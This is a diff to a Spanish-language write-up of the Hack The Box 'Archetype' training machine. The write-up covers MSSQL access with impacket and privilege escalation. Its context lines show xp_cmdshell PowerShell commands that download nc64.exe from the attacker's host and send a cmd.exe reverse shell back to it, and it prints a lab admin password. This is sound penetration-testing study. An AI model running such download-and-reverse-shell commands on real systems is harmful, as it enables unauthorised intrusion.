@@ -20,7 +20,7 @@ keywords:
 
 - 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+2/Windows/Archetype)
 - 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=Xz5oX2bH5VM)|[Parte2](https://www.youtube.com/watch?v=562uiR37VvA)
-- 🧠 **Explicación resumida**: 
+- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=lE4SgO_s_d8)
 
 --------
 
@@ -96,7 +96,7 @@ Vamos a entablar la conexion con el comando `impacket-mssqlclient ARCHETYPE/sql_
 
 ![[Archetype10.png]]
 
-Vamos a chequear con el comando `SELECT is_svrolemember('sysadmin')` si somos admin, si nos da de resultado 1 es true
+Vamos a chequear con el comando `SELECT is_srvrolemember('sysadmin');` si somos admin, si nos da de resultado 1 es true
 
 ![[Archetype11.png]]
 
@@ -119,14 +119,13 @@ Y como podemos ver responde que somos archetype/sql_svc. Asi que ya confirmamos 
 
 
 ---------
-
 # [[Reverse shell]] para la intrusion
 #### Para mandar la [[Reverse shell]] vamos a necesitar de [[Netcat]]
 
 [Link de netcat para 64bits](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) Vamos a levantar un server de [[python3 -m http.server]] desde nuestra maquina, para que por wget lo descargue la maquina victima. Y a posteriori vamos a ponernos en escucha con  [[rlwrap -cAr nc -lvnp 443]] para la reverseshell
 
 ```shell
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.16/nc64.exe -outfile nc64.exe           / Descargamos el archivo
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.16/nc64.exe -outfile nc64.exe"           / Descargamos el archivo
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.16 443"                       / Mandamos la reverseshell
 ```
 
@@ -139,7 +138,6 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 
 Y una vez dentro, podemos visualizar la primera flag
 
 ![[Archetype15.png]]
-
 
 -------
 # Escalada de privilegios con [[Logs de la powershell y de consola]]
@@ -157,8 +155,6 @@ MEGACORP_4dm1n!!
 ![[Archetype17.png]]
 Una vez dentro ya podemos visualizar la flag
 ![[Archtype18.png]]
-
---------
 
 --------
 # Creditos
